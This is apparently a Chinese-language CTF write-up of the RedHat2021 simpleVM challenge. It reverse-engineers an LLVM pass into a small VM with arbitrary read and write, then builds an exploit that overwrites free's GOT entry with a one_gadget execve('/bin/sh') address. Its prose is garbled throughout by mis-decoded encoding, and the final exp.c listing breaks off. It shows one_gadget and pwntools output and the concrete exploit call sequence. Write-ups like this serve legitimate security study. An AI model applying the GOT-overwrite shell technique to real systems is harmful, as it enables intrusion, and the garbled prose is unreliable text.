<p>é¦–å…ˆä½¿ç”¨äº†getNameå‡½æ•°è·å–äº†Valueå¯¹è±¡çš„åå­—ï¼Œè¿™é‡Œå…¶éå†çš„æ˜¯å‡½æ•°åï¼Œç¬”è€…åˆ†äº«ä¸€ç§çœ‹ä»£ç çš„æ–¹æ³•ï¼šä»åå¾€å‰ï¼Œæ‰§æœç´¢å› ã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ€åä¸‰è¡Œæ˜¯å¦‚æœv4ä¸ç­‰äº0å°±æ‰§è¡Œsub_6AC0å‡½æ•°ï¼Œå¦åˆ™å°±è¿”å›ã€‚åœ¨runOnFunctionå‡½æ•°ä¸­æˆ‘ä»¬æ²¡æœ‰å‘ç°ä»»ä½•æœ‰å…³äºå†…å­˜ç©ºé—´æ”¹åŠ¨çš„å‡½æ•°ï¼Œåªæœ‰ä¸€ä¸ªstrlenå’Œmemcmpå‡½æ•°ç”¨äºè¿›è¡Œå†…å­˜æ“ä½œï¼Œä½†è¿™ä¸¤ä¸ªå‡½æ•°éƒ½å¹¶ä¸ä¼šå¯¹å†…å­˜ä¸­å¯¹åº”åœ°å€çš„å€¼äº§ç”Ÿä»»ä½•å˜åŒ–ã€‚å› æ­¤æ¼æ´ç‚¹ä¸€å®šä¸åœ¨runOnFunctionå‡½æ•°ï¼Œéœ€è¦æ‰§è¡Œåˆ°sub_6A70å‡½æ•°ã€‚é‚£ä¹Ÿå°±æ„å‘³ç€v4ä¸èƒ½ç­‰äº0ã€‚å‰é¢çš„ä»£ç ä¸­ï¼Œå”¯ä¸€èƒ½è®©v4å¯èƒ½ä¸ç­‰äº0çš„è¯­å¥å°±æ˜¯<code>v4=v8==0</code>ã€‚æ³¨æ„è¿™æ¡è¯­å¥çš„æ„æ€æ˜¯å¦‚æœ<code>v8==0</code>é‚£ä¹ˆv4=1ã€‚çœ‹ä¸€ä¸‹æ±‡ç¼–ä»£ç å°±å¯ä»¥çŸ¥é“ï¼š<br />
<img src="4.png" alt="" /><br />
è¿™é‡Œä½¿ç”¨äº†ä¸€ä¸ªsetzæŒ‡ä»¤ï¼Œå®ƒçš„å«ä¹‰æ˜¯å½“æ ‡å¿—å¯„å­˜å™¨ä¸­çš„ZFä½ä¸º1æ—¶ï¼Œå°†alçš„å€¼è®¾ä¸º1ã€‚å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦è®©<code>v8==0</code>æ‰è¡Œã€‚ä¸éš¾å‘ç°ï¼Œ<code>v8==0</code>çš„æ¡ä»¶å°±æ˜¯å‡½æ•°åç­‰äº&quot;o0o0o0o0&quot;ã€‚å› æ­¤è¿™ä¸ªLLVM passåªä¼šå¯¹åä¸º&quot;o0o0o0o0&quot;çš„å‡½æ•°è¿›è¡Œä¸€äº›æ“ä½œã€‚æˆ‘ä»¬å†æ¥åˆ°sub_6A70å‡½æ•°çœ‹ä¸€ä¸‹æ‰§è¡Œäº†ä»€ä¹ˆæ“ä½œã€‚</p>
<h2 id="step-3-åˆ†æsub_6ac0å‡½æ•°"><a class="markdownIt-Anchor" href="#step-3-åˆ†æsub_6ac0å‡½æ•°"></a> Step 3: åˆ†æsub_6AC0å‡½æ•°</h2>
<p>ä¸‹é¢å°±æ˜¯sub_6AC0å‡½æ•°çš„å†…å®¹ï¼š</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">sub_6AC0</span><span class="params">(__int64 a1, llvm::Function *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  llvm::BasicBlock *v3; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+38h] [rbp-18h] BYREF</span></span><br><span class="line">  __int64 v5[<span class="number">2</span>]; <span class="comment">// [rsp+40h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v5[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v5[<span class="number">0</span>] = llvm::Function::<span class="built_in">begin</span>(a2);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = llvm::Function::<span class="built_in">end</span>(a2);</span><br><span class="line">    <span class="keyword">if</span> ( (llvm::<span class="keyword">operator</span>!=(v5, &amp;v4) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = (llvm::BasicBlock *)llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::<span class="keyword">operator</span>*(v5);</span><br><span class="line">    <span class="built_in">sub_6B80</span>(a1, v3);</span><br><span class="line">    llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::<span class="keyword">operator</span>++(</span><br><span class="line">      v5,</span><br><span class="line">      <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œçš„<code>llvm::Function::begin</code>å’Œ<code>llvm::Function::end</code>éƒ½æ˜¯Functionç±»çš„è¿­ä»£å™¨å¯¹è±¡ï¼Œå…¶è¿­ä»£çš„å¯¹è±¡æ˜¯å‡½æ•°ä¸­çš„åŸºæœ¬å—ã€‚å› æ­¤è¿™ä¸ªå¾ªç¯çš„æ„æ€å°±æ˜¯å¯¹æ¯ä¸€ä¸ªåŸºæœ¬å—æ‰§è¡Œsub_6B80å‡½æ•°ã€‚å…¶ä¸­<code>v3 = (llvm::BasicBlock *)llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,false,false,void&gt;,false,false&gt;::operator*(v5);</code>è¿™æ¡è¯­å¥ä¸­çš„<code>ilist</code>æ˜¯LLVMæ ‡å‡†åº“ä¸­å®šä¹‰çš„ä¸€ä¸ªæ•°æ®ç»“æ„ï¼Œä¸C++æ ‡å‡†æ¨¡æ¿åº“listç±»ä¼¼ï¼Œä½†æ˜¯LLVMä¸­éƒ½æ˜¯ä½¿ç”¨ilistæ¥å­˜å‚¨ä¸€ä¸ªå‡½æ•°çš„æ‰€æœ‰åŸºæœ¬å—æˆ–æŒ‡ä»¤ï¼Œå¯ä»¥å°†å…¶çœ‹æˆä¸€ä¸ªåˆ—è¡¨ï¼Œé’ˆå¯¹äºLLVMåšäº†ä¸€äº›ç‰¹æ®Šçš„ä¼˜åŒ–ã€‚é‚£ä¹ˆv3ä¹Ÿå°±æ˜¯å‡½æ•°ä¸­çš„æ¯ä¸€ä¸ªåŸºæœ¬å—ã€‚æˆ‘ä»¬éœ€è¦è¿›å…¥sub_6B80å‡½æ•°çœ‹ä¸€ä¸‹å¯¹è¿™äº›åŸºæœ¬å—åˆè¿›è¡Œäº†ä»€ä¹ˆæ“ä½œã€‚</p>
<h2 id="step-4-åˆ†æsub_6b80å‡½æ•°"><a class="markdownIt-Anchor" href="#step-4-åˆ†æsub_6b80å‡½æ•°"></a> Step 4: åˆ†æsub_6B80å‡½æ•°</h2>
<p>è¿™ä¸ªå‡½æ•°æ˜¯ä¸»è¦æ“ä½œï¼Œæ¯”è¾ƒé•¿ï¼Œæˆ‘ä»¬ä¸€ç‚¹ç‚¹æ¥çœ‹ã€‚</p>
<h3 id="segment-1"><a class="markdownIt-Anchor" href="#segment-1"></a> Segment 1</h3>
<p><img src="5.png" alt="" /><br />
è¿™ä¸€æ®µä¸­å¯ä»¥çœ‹åˆ°ï¼Œä½¿ç”¨äº†ä¸€ä¸ªå¤§å¾ªç¯ï¼Œæ˜¯å¯¹åŸºæœ¬å—è¿›è¡Œéå†ã€‚è¿™é‡Œçš„v36å˜é‡æ˜¯ä»v39å˜é‡dyn_castè¿‡æ¥çš„ï¼Œè¿™æ˜¯ä¸€ä¸ªllvmå®šä¹‰çš„ç±»å‹è½¬æ¢ï¼Œä¸ç”¨å»ç®¡ã€‚è¿™é‡Œæ˜¯å°†v36è½¬æ¢æˆäº†InstructionæŒ‡ä»¤å¯¹è±¡ï¼Œç„¶åè·å–äº†è¿™ä¸ªæŒ‡ä»¤çš„æŒ‡ä»¤ç <code>getOpcode(v36)</code>ã€‚è¿™ä¸ªæŒ‡ä»¤ç çš„å®šä¹‰ç¬”è€…æ‰¾èµ„æ–™æ‰¾äº†å¥½ä¹…éƒ½æ²¡æœ‰æ‰¾åˆ°ï¼Œæœ€ç»ˆæŸ¥çœ‹æºç æ‰å‘ç°å…¶å®šä¹‰ä¿å­˜åœ¨<code>llvm/IR/Instruction.def</code>æ–‡ä»¶ä¸­ï¼Œä¸Šé¢çš„ä»£ç æ„æ€æ˜¯æŒ‡ä»¤ç éœ€è¦ä¸º55æ‰èƒ½è¿›å…¥ä¸‹ä¸€æ­¥æ“ä½œï¼Œå¦åˆ™å°±ä¼šç›´æ¥è·³è¿‡è¿™ä¸ªæŒ‡ä»¤å»å¤„ç†ä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚æˆ‘ä»¬çœ‹ä¸€ä¸‹<code>llvm/IR/Instruction.def</code>æ–‡ä»¶ä¸­å“ªä¸ªæŒ‡ä»¤çš„æŒ‡ä»¤ç æ˜¯55ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HANDLE_OTHER_INST(55, Call, CallInst)</span><br></pre></td></tr></table></figure>
<p>å³CallæŒ‡ä»¤çš„æŒ‡ä»¤ç ä¸º55ã€‚å¦‚æœæŸ¥çœ‹ä¸Šä¸€ç¯‡æ–‡ç« ä¸­ç”Ÿæˆçš„.llæ–‡ä»¶å°±å¯ä»¥å‘ç°ï¼Œå‡½æ•°è°ƒç”¨å°±æ˜¯ç”¨CallæŒ‡ä»¤æ¥è¡¨ç¤ºçš„ã€‚ä¹Ÿå³o0o0o0o0å‡½æ•°ä¸­çš„æ‰€æœ‰ä»£ç éƒ½è¦æ˜¯å‡½æ•°è°ƒç”¨ï¼Œå…¶ä»–çš„ä»£ç å†™äº†ä¹Ÿä¸ä¼šå¤„ç†ã€‚</p>
<p>ç”±æ­¤æˆ‘ä»¬å¯ä»¥çŒœæµ‹å‡ºv35å˜é‡çš„CallBaseæŒ‡é’ˆç±»å‹å®é™…ä¸Šä¹Ÿå°±æ˜¯å‡½æ•°è°ƒç”¨çš„å¯¹è±¡ã€‚æºç ä¸­çš„æ³¨é‡Šè¯´ï¼Œ<code>CallBase</code>å¯¹è±¡æ˜¯æ‰€æœ‰å¯ä»¥è°ƒç”¨çš„æŒ‡ä»¤çš„åŸºç±»ï¼Œè¿™é‡Œâ€œå¯ä»¥è°ƒç”¨çš„æŒ‡ä»¤â€åŒ…å«<code>InvokeInst</code>å’Œ<code>CallInst</code>ã€‚æ‰€æœ‰è°ƒç”¨çš„æŒ‡ä»¤éƒ½å«æœ‰ï¼šè°ƒç”¨çš„å‡½æ•°è‡ªèº«ã€é›¶æˆ–è‹¥å¹²ä¸ªå‚æ•°ã€<font color=blue>é›¶æˆ–è‹¥å¹²ä¸ªæ“ä½œæ•°ç»„ä»¥åŠé›¶æˆ–è‹¥å¹²ä¸ªæ“ä½œæ•°è¾“å…¥ <strong>ï¼ˆåŸæ–‡æ˜¯operand bundleï¼Œç¬”è€…ä¸ç¡®å®šè¿™é‡ŒæŒ‡çš„æ˜¯ä¸æ˜¯æ•°ç»„çš„æ„æ€ï¼Œå¦‚æœ‰é”™è¯¯è¿˜è¯·è¯»è€…æŒ‡æ­£ï¼‰</strong></font></p>
<p>ä¸‹é¢çš„<code>getCalledFunction</code>å°±æ˜¯è·å–å‡½æ•°æœ¬èº«ï¼Œå°†å‡½æ•°åæ‹·è´åˆ°äº†å˜é‡s1ä¸­ï¼Œä¸‹é¢åˆ¤æ–­å‡½æ•°åæ˜¯å¦æ˜¯popï¼Œå¦‚æœæ˜¯åˆ¤æ–­<code>getNumOperands()</code>å‡½æ•°çš„ç»“æœæ˜¯ä¸æ˜¯2ã€‚è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<code>getNumOperands()</code>å‡½æ•°å¹¶ä¸æ˜¯è¿”å›å‡½æ•°å‚æ•°çš„ä¸ªæ•°ï¼Œè€Œæ˜¯è¿”å›ä¸€æ¡æŒ‡ä»¤ä¸­çš„å˜é‡ä¸ªæ•°ã€‚æ³¨æ„è¿™é‡Œçš„v35å˜é‡ç±»å‹æ˜¯<strong>CallBase</strong>ï¼Œæ˜¯æŒ‡ä»¤<strong>Instructions</strong>çš„å­ç±»ï¼Œä¸CalledFunctionå˜é‡çš„ç±»å‹å®Œå…¨ä¸åŒã€‚éšä¾¿æˆªå–ä¸€æ®µ.llæ–‡ä»¶çš„ä»£ç å¯ä»¥çœ‹åˆ°callåé¢ä¼šè·Ÿä¸Šå˜é‡åï¼Œå˜é‡åä¹‹å‰åŠ ä¸Š@ç¬¦å·è¯´æ˜llvmå°†å…¶è®¤ä¸ºæ˜¯ä¸€ä¸ªå˜é‡ã€‚å› æ­¤åœ¨è¿™é‡Œå…¶å®é™…è¿”å›çš„å€¼åº”è¯¥æ˜¯å‡½æ•°å‚æ•°çš„ä¸ªæ•°+1ã€‚</p>
<p><img src="6.png" alt="" /></p>
<h3 id="segmant-2"><a class="markdownIt-Anchor" href="#segmant-2"></a> Segmant 2</h3>
<p>ä¹‹åæˆ‘ä»¬è¿›å…¥åˆ†æå½“å‡½æ•°åä¸ºpopæ—¶è¿›è¡Œäº†ä½•ç§å¤„ç†ã€‚åé¢çš„ä¸€äº›å˜é‡ç¬”è€…é‡å‘½åäº†ä¸€ä¸‹ï¼Œè¯»è€…å¯ä»¥è‡ªå·±æ‰“å¼€IDAå¯¹ç…§ä¸€ä¸‹ã€‚</p>
<p><img src="7.png" alt="" /><br />
popå‡½æ•°çš„å‚æ•°ä¸ªæ•°åº”è¯¥æ˜¯1ã€‚ä¹‹åè¿›å…¥å†…éƒ¨è°ƒç”¨äº†<code>getArgOperand</code>å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°æ˜¯ç”¨æ¥è¿”å›è¢«è°ƒç”¨çš„å‡½æ•°çš„ç¬¬ä¸€ä¸ª<strong>å®å‚</strong>çš„å€¼ï¼Œç„¶åv31å˜é‡èµ‹å€¼ä¸ºè¿™ä¸ªå€¼ï¼Œå¹¶ä»¥<code>ConstantInt</code>å³æ•´å‹å¸¸é‡çš„ç±»å‹ä¿å­˜ã€‚å¦‚æœè¿™ä¸ªå€¼ä¸ä¸º0ï¼Œé‚£ä¹ˆå†æ¬¡è¿›è¡Œè½¬æ¢ï¼Œ<code>getZExtValue</code>è¿™ä¸ªå‡½æ•°æˆ‘ä»¬åœ¨ä¸Šä¸€ç¯‡æ–‡ç« ä¸­è§è¿‡ç±»ä¼¼çš„å‡½æ•°ï¼Œé€šè¿‡å‡½æ•°åçŒœæµ‹å…¶åŠŸèƒ½ï¼šget Zero Extended Valueï¼Œå³æ— ç¬¦å·æ‰©å±•æ•´æ•°ã€‚å…¶ä¸º1æˆ–2æ—¶v32å˜é‡æŒ‡å‘ä¸¤æ®µå†…å­˜çš„åœ°å€ï¼Œè¿™ä¸¤æ®µå†…å­˜åˆ†åˆ«è¢«å‘½åä¸ºreg1å’Œreg2ã€‚åé¢åˆå°†v3å˜é‡èµ‹å€¼ä¸ºæŸæ®µå†…å­˜çš„äºŒé‡æŒ‡é’ˆï¼ˆå› ä¸ºstackdoubleptrå˜é‡ä¿å­˜çš„æ˜¯ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘å†…å­˜ç©ºé—´ï¼Œå› æ­¤è¿™é‡Œè¡¨ç¤ºå…¶ä¸ºäºŒé‡æŒ‡é’ˆï¼‰ã€‚é‚£ä¸€æ®µå†…å­˜ç©ºé—´è¢«å‘½åä¸ºstackã€‚hmmmï¼Œè¿™æ ·çœ‹èµ·æ¥ç¨‹åºä¸­æœ‰ä¸€ä¸ªå°çš„vmï¼Œæœ‰è™šæ‹Ÿå‡ºæ¥çš„å¯„å­˜å™¨å’Œæ ˆï¼Œç®—æ˜¯å’Œvmé¢˜å¾ˆåƒäº†ã€‚è€Œä¸”è¿™é‡Œçš„æ“ä½œä¹Ÿå’Œæ±‡ç¼–çš„popæŒ‡ä»¤å®Œå…¨ç›¸åŒï¼Œå°†æ ˆé¡¶çš„å€¼èµ‹å€¼ç»™reg1æˆ–reg2ï¼Œç„¶åæ ˆæŒ‡é’ˆä¸‹ç§»8ã€‚å› æ­¤è¿™ä¸ªvmä¸­æ ˆåº•åœ¨ä½åœ°å€ï¼Œè€Œæ ˆé¡¶åœ¨é«˜åœ°å€ï¼Œä¸æ±‡ç¼–ä¸­çš„æ ˆæ’åˆ—ç›¸åã€‚</p>
<p>ç°åœ¨æˆ‘ä»¬çŸ¥é“äº†è¿™é‡Œå¯èƒ½æ˜¯ä¸€ä¸ªvmï¼Œé‚£ä¹ˆåˆ†æåé¢çš„æ¡ä»¶åˆ¤æ–­å°±ä¼šå¿«ä¸Šå¾ˆå¤šäº†ã€‚</p>
<h3 id="segment-3"><a class="markdownIt-Anchor" href="#segment-3"></a> Segment 3</h3>
<p><img src="8.png" alt="" /><br />
ä¸‹é¢ä¸€ä¸ªæ¡ä»¶åˆ¤æ–­åˆ¤æ–­å‡½æ•°åæ˜¯å¦æ˜¯pushï¼Œæƒ³éƒ½ä¸ç”¨æƒ³è¿™ä¸€å®šæ˜¯å…¥æ ˆæ“ä½œï¼Œå°†ä¸¤ä¸ªå¯„å­˜å™¨ä¸­çš„ä¸€ä¸ªçš„å€¼å‹å…¥æ ˆä¸­ï¼Œç„¶åæ ˆæŒ‡é’ˆä¸Šç§»ã€‚</p>
<h3 id="segment-4"><a class="markdownIt-Anchor" href="#segment-4"></a> Segment 4</h3>
<p><img src="9.png" alt="" /><br />
å½“å‡½æ•°åä¸ºstoreæ—¶ï¼Œæ³¨æ„æœ€åçš„4è¡Œä»£ç ï¼Œå‡ºç°äº†æŒ‡é’ˆæ“ä½œã€‚å…¶å°†ä¸€ä¸ªå¯„å­˜å™¨çœ‹æˆæŒ‡é’ˆï¼Œå°†è¿™ä¸ªåœ°å€ä¿å­˜çš„å€¼æ‹·è´åˆ°å¦å¤–ä¸€ä¸ªåœ°å€ï¼Œè¿™ä¸ªåœ°å€å°±æ˜¯å¦å¤–ä¸€ä¸ªå¯„å­˜å™¨æŒ‡å®šçš„åœ°å€çš„åœ°å€ï¼ˆäºŒé‡æŒ‡é’ˆï¼‰ã€‚å¾ˆæ˜æ˜¾è¿™é‡Œæˆ‘ä»¬å¯ä»¥å°†ä»»æ„åœ°å€ä¿å­˜åˆ°è¿™ä¸¤ä¸ªå¯„å­˜å™¨ä¸­ã€‚</p>
<h3 id="segment-5"><a class="markdownIt-Anchor" href="#segment-5"></a> Segment 5</h3>
<p><img src="10.png" alt="" /><br />
å½“å‡½æ•°åä¸ºloadæ—¶ï¼Œæ“ä½œä¸storeç±»ä¼¼ï¼Œä½†è¦æ³¨æ„æ‹·è´çš„æ–¹å‘ã€‚storeå’Œloadå‡½æ•°ä¸€å®šä¼šæ˜¯æˆ‘ä»¬pwnçš„é‡ç‚¹ï¼Œè‡³äºå…·ä½“åº”è¯¥å¦‚ä½•å»pwnï¼Œå¾…ä¸‹é¢è¿›è¡Œè°ƒè¯•æ—¶å†å»æ¢ç´¢ã€‚</p>
<h3 id="segment-6"><a class="markdownIt-Anchor" href="#segment-6"></a> Segment 6</h3>
<p><img src="11.png" alt="" /><br />
addå‡½æ•°åŠ æ³•æ“ä½œï¼Œæœ‰ä¸¤ä¸ªå‚æ•°ã€‚ç¬¬ä¸€ä¸ªå‚æ•°æŒ‡å®šå¯„å­˜å™¨ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯è¦åŠ åˆ°è¿™ä¸ªå¯„å­˜å™¨ä¸Šçš„æ•°å€¼ã€‚è¿™ä¸ªå‡½æ•°å¯¹äºæˆ‘ä»¬çš„pwnä¹Ÿæ˜¯æœ‰å¾ˆå¤§æ„ä¹‰çš„ã€‚å¯ä»¥æ„é€ ä»»æ„åœ°å€ã€‚</p>
<h3 id="segment-7"><a class="markdownIt-Anchor" href="#segment-7"></a> Segment 7</h3>
<p><img src="12.png" alt="" /><br />
minå‡½æ•°å‡æ³•æ“ä½œï¼Œæœ‰2ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æŒ‡å®šå¯„å­˜å™¨ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯è¦å‡å»çš„æ•°å€¼ã€‚</p>
<p>è‡³æ­¤ï¼Œæºç å·²ç»å…¨éƒ¨åˆ†æå®Œæ¯•ã€‚æˆ‘ä»¬å·²ç»å¯ä»¥åœ¨expä¸­ç¼–å†™6ä¸ªå‡½æ•°çš„åŸå‹äº†ï¼Œæ³¨æ„å‚æ•°çš„ç±»å‹å’Œä¸ªæ•°ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">o0o0o0o0</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">pop</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">store</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">load</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> reg1, <span class="type">int</span> reg2)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">min</span><span class="params">(<span class="type">int</span> reg1, <span class="type">int</span> reg2)</span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">o0o0o0o0</span><span class="params">()</span>&#123;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="step-5-ç¼–å†™expcåŒæ—¶è¿›è¡Œè°ƒè¯•"><a class="markdownIt-Anchor" href="#step-5-ç¼–å†™expcåŒæ—¶è¿›è¡Œè°ƒè¯•"></a> Step 5: ç¼–å†™exp.cï¼ŒåŒæ—¶è¿›è¡Œè°ƒè¯•</h2>
<p>ç°åœ¨ï¼Œæˆ‘ä»¬æ¥ç€æ‰‹ç¼–å†™expï¼Œé‡ç‚¹éœ€è¦è°ƒè¯•loadå’Œstoreè¿™ä¸¤ä¸ªå‡½æ•°çš„æ‰§è¡Œã€‚</p>
<p>ä¸€å¼€å§‹ï¼Œreg1ã€reg2ã€stackä¸­æ‰€æœ‰çš„å€¼éƒ½ä¸º0ï¼Œç”±äºæœ¬é¢˜ä¸­opt-8ç¨‹åºæ²¡æœ‰å¼€å¯PIEä¿æŠ¤ï¼Œå› æ­¤å…¶åŠ è½½åŸºå€å›ºå®šä¸å˜ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªè·å–åˆ°å…¶gotè¡¨ä¸­çš„åœ°å€ï¼Œå°†å…¶æ‹·è´åˆ°regæˆ–stackä¸­ã€‚ç„¶ååœ¨æ­¤åŸºç¡€ä¸Šè®¡ç®—å‡ºone_gadgetçš„åœ°å€ï¼Œå°†å…¶å†™å›åˆ°gotè¡¨ï¼Œå³å¯æ‰§è¡Œone_gadgetï¼Œé€»è¾‘å¾ˆç®€å•ã€‚</p>
<p>åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬é€‰æ‹©freeå‡½æ•°ä½œä¸ºåœ°å€è¦†ç›–çš„å¯¹è±¡ï¼Œæ‰¾åˆ°optç¨‹åºä¸­freeå‡½æ•°gotè¡¨çš„ä½ç½®ä¸º0x77E100ã€‚å› æ­¤o0o0o0o0å‡½æ•°çš„ç¬¬ä¸€æ¡è¯­å¥åº”è¯¥æ˜¯ï¼š<code>add(1, 0x77E100);</code>ã€‚ç„¶åä½¿ç”¨loadå‡½æ•°å°†gotè¡¨ä¸­åœ°å€å€¼ä¿å­˜åˆ°å¦ä¸€ä¸ªå¯„å­˜å™¨ä¸­ï¼š<code>load(1);</code>ã€‚ç°åœ¨æˆ‘ä»¬æƒ³è¦çš„åœ°å€åœ¨reg2ä¸­ï¼ŒåŠ ä¸Šç›¸åº”çš„one_gadgetåç§»ã€‚ä¸ä¸Šä¸€é¢˜ç›¸åŒï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯ç¬”è€…è™šæ‹Ÿæœºçš„libcè€Œä¸æ˜¯é¢˜ç›®ç»™çš„libcï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/Desktop/LLVM/challenges/RedHat2021-simpleVM# one_gadget /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [r12] == NULL || r12 == NULL</span><br><span class="line"></span><br><span class="line">0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br><span class="line"></span><br><span class="line">0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == NULL || rsi == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br></pre></td></tr></table></figure>
<p>æ‰¾åˆ°freeå‡½æ•°åç§»ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/Desktop/LLVM/challenges/RedHat2021-simpleVM# python3</span><br><span class="line">Python 3.8.10 (default, Jun 22 2022, 20:18:18) </span><br><span class="line">[GCC 9.4.0] on linux</span><br><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class="line">&gt;&gt;&gt; from pwn import *</span><br><span class="line">&gt;&gt;&gt; libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">[*] &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">&gt;&gt;&gt; print(hex(libc.symbols[&#x27;free&#x27;]))</span><br><span class="line">0x9a6d0</span><br><span class="line">&gt;&gt;&gt; </span><br></pre></td></tr></table></figure>
<p>å› æ­¤ï¼Œç¬¬ä¸‰æ¡è¯­å¥åº”è¯¥æ˜¯<code>add(2, 0x4942e);</code>ï¼Œè¿™æ ·å°±å¾—åˆ°äº†ç¬¬ä¸€ä¸ªone_gadgetçš„åœ°å€ã€‚ç¬¬å››æ¡è¯­å¥å°†å…¶å†™å›åˆ°free.gotä¸­ï¼š<code>store(1);</code>ï¼Œå®Œæˆï¼Œæˆ‘ä»¬è¿stackéƒ½æ²¡æœ‰ç”¨åˆ°ã€‚</p>
<p>expï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">o0o0o0o0</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">pop</span><span class="params">(<span 